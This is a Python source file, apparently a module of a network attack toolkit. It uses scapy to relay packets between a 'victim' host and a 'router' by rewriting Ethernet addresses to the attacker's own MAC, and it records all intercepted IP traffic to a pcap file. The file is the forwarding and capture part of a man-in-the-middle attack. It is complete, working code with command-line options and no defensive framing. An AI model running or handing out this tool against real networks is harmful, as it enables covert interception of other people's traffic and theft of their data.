import scapy.all as scapy
from scapy.all import IP, Ether
from scapy.all import PcapWriter, sniff
from datetime import datetime

ip_forward_v = 2.1

import sys, os
from src.envena.config import Success, Clear
from src.envena.functions import validate_args

ip_dst = ''
eth_dst = ''
ip_src = ''
eth_src = ''
iface = scapy.conf.iface
my_eth = scapy.get_if_hwaddr(iface)

def addr_spoof(packet):
    global ip_dst, eth_dst, ip_src, eth_src, iface, my_eth

    if packet.haslayer(IP) and packet.haslayer(Ether):
        eth = packet[Ether]
        ip = packet[IP]

        # Пакет от жертвы — пересылаем на шлюз
        if eth.src == eth_dst and ip.src == ip_dst:
            eth.dst = eth_src
            eth.src = my_eth
            scapy.sendp(packet, iface=iface, verbose=0)
            print(f"[->] {ip.src} -> {ip.dst} (к шлюзу)")

        # Пакет от шлюза — пересылаем жертве
        elif eth.src == eth_src and ip.src == ip_src:
            eth.dst = eth_dst
            eth.src = my_eth
            scapy.sendp(packet, iface=iface, verbose=0)
            print(f"[<-] {ip.src} -> {ip.dst} (к жертве)")

def ip_forward(args):
    global ip_dst, eth_dst, ip_src, eth_src
    if not validate_args(ip_dst=args['ip_dst'], eth_dst=args['eth_dst'], ip_src=args['ip_src'], eth_src=args['eth_src']):
        return False

    ip_dst = args['ip_dst']
    eth_dst = args['eth_dst']
    ip_src = args['ip_src']
    eth_src = args['eth_src']
    
    if args['iface']:
        global iface
        iface = args['iface']

    now = datetime.now()
    filename = f'ip_forwarding_{now.strftime("%Y%m%d_%H%M%S")}.pcap'

    try:
        pcap_writer = PcapWriter(filename=filename, append=False, sync=True)
    except Exception:
        filename = f'ip_forwarding_{now.strftime("%Y%m%d_%H%M%S")}.pcap'
        pcap_writer = PcapWriter(filename=filename, append=False, sync=True)

    print(f"IP forwarding, version: {ip_forward_v}")
    print('* IP forwarding started')
    print(f'Router: {ip_src}_{eth_src}')
    print(f'Victim: {ip_dst}_{eth_dst}')
    print(f'Interface: {iface}')
    
    forwarded_packets = sniff(filter='ip', prn=addr_spoof, store=True, iface=iface)
    pcap_writer.write(forwarded_packets)
    print(f'\n{Success}Traffic was written in \'{filename}\'{Clear}')

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description=f"IP forwarding module. Version: {ip_forward_v}")
    parser.add_argument("--ip_dst", "-id", help="Destination IP address (victim).", required=True)
    parser.add_argument("--eth_dst", "-ed", help="Destination MAC address (victim).", required=True)
    parser.add_argument("--ip_src", "-is", help="Source IP address (router).", required=True)
    parser.add_argument("--eth_src", "-es", help="Source MAC address (router).", required=True)
    parser.add_argument("-i", "--iface", help="Network interface to send from.", required=False)

    arg = parser.parse_args()
    args = {
        'ip_dst': arg.ip_dst,
        'eth_dst': arg.eth_dst,
        'ip_src': arg.ip_src,
        'eth_src': arg.eth_src,
        'iface': arg.iface
    }

    ip_forward(args)
